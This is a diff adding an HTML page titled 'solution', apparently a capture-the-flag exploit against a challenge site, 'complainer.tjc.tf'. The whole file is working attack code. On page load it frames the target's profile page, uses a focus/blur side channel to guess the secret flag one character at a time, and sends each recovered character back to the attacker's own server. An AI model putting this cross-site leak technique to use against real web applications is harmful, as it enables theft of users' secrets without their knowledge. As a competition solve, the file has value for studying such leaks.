@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>solution</title>
+</head>
+
+<body>
+    <input type="text" id="reset">
+    <script>
+        const reset = document.getElementById('reset');
+        const frame = document.querySelector('iframe');
+
+        const BASE_URL = 'https://complainer.tjc.tf';
+
+        let flag = 'tjctf{';
+
+        const TIMEOUT = 1000;
+        let currChar = null;
+
+        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789_{}';
+
+
+        function sleep(time) {
+            return new Promise(resolve => setTimeout(resolve, time));
+        }
+
+        onblur = async () => {
+            console.log('found: ' + currChar);
+            flag += currChar;
+            reset.value = flag;
+            fetch(`/flag?flag=${flag}`, {
+                mode: 'no-cors'
+            });
+        }
+
+        const getChar = async (char) => {
+            const frame = document.createElement('iframe');
+            frame.src = `${BASE_URL}/profile`;
+            document.body.appendChild(frame);
+            await sleep(100);
+            fetch(`/profile-0-${flag.length}-${char}`, {
+                mode: 'no-cors'
+            })
+            frame.src = `${BASE_URL}/profile#0-${flag.length}-${char}`;
+            await sleep(TIMEOUT);
+            document.body.removeChild(frame);
+        }
+
+        const getFlag = async () => {
+            fetch('/reset', {
+                mode: 'no-cors'
+            });
+            while (true) {
+                let lastFlag = flag;
+                for (let i = 0; i < chars.length; i++) {
+                    currChar = chars[i];
+                    console.log(currChar);
+                    await getChar(currChar);
+                    if (lastFlag !== flag) {
+                        console.log(flag);
+                        break;
+                    }
+                }
+
+                if (lastFlag === flag) {
+                    console.log(flag);
+                    return;
+                }
+
+                reset.focus();
+                await sleep(5);
+            }
+        }
+
+        document.body.onload = getFlag;
+    </script>
+</body>
+
+</html>
